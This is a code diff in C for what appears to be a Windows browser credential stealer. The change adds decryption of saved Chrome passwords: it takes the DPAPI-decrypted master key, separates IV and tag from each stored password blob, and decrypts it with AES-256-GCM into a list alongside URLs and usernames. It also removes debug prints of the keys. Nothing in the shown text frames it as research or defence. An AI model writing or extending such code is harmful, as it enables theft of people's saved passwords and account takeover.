@@ -97,14 +97,29 @@ LF_Chrome__profile_search_callback (char *dir_path, WIN32_FIND_DATA ffd,
 }
 void
 LF_Chrome__login_data_db_search_callback (
-    void *data, struct LF_SQLite_entry_struct *entries)
+    char *decrypted_key, void *data, struct LF_SQLite_entry_struct *entries)
 {
   struct LF_Chrome_login_data_struct *login_data
       = malloc (sizeof (struct LF_Chrome_login_data_struct));
   // are those strdup's free'd?
   login_data->action_url = strdup (entries[0].value);
   login_data->username_value = strdup (entries[1].value);
-  login_data->password_value = strdup (entries[2].value); // encrypted
+
+  char *password_value = entries[2].value;
+  int password_value_len = entries[2].value_len;
+
+  char *iv = NULL;
+  char *tag = NULL;
+  int tag_len = 0;
+  LF_Crypter_separate_iv_tag (password_value, password_value_len, &iv, &tag,
+                              &tag_len);
+
+  login_data->password_value
+      = LF_Crypter_decrypt_aes_256_gcm (decrypted_key, iv, tag, tag_len);
+
+  free (password_value);
+  free (iv);
+  free (tag);
 
   LF_Utils_arraylist_add ((struct LF_Utils_arraylist_struct *)data,
                           login_data);
@@ -129,12 +144,10 @@ LF_Chrome_populate_data (struct LF_Chrome_data_struct *out)
   int encryption_key_len;
   char *encryption_key
       = LF_Chrome__get_encryption_key (localstate_path, &encryption_key_len);
-  printf ("encryption key [%d]: %s\n", encryption_key_len, encryption_key);
 
   int decrypted_key_len;
   char *decrypted_key = LF_Crypter_decrypt_dpapi (
       encryption_key, encryption_key_len, &decrypted_key_len);
-  printf ("decrypted key [%d]: %s\n", decrypted_key_len, decrypted_key);
 
   out->profile_path_list = LF_Utils_arraylist_new_default ();
   out->login_data_list = LF_Utils_arraylist_new_default ();
@@ -159,7 +172,7 @@ LF_Chrome_populate_data (struct LF_Chrome_data_struct *out)
             = "SELECT action_url, username_value, password_value FROM logins";
         LF_SQLite_exec (login_data_path, sql,
                         LF_Chrome__login_data_db_search_callback,
-                        out->login_data_list);
+                        decrypted_key, out->login_data_list);
       }
     }
   free (encryption_key);
@@ -167,7 +180,7 @@ LF_Chrome_populate_data (struct LF_Chrome_data_struct *out)
 }
 void
 LF_Chrome_free_data (struct LF_Chrome_data_struct *out)
-{  
+{
   LF_Utils_arraylist_free (out->profile_path_list);
   LF_Utils_arraylist_free (out->login_data_list);
   LF_Utils_arraylist_free (out->cookie_data_list);
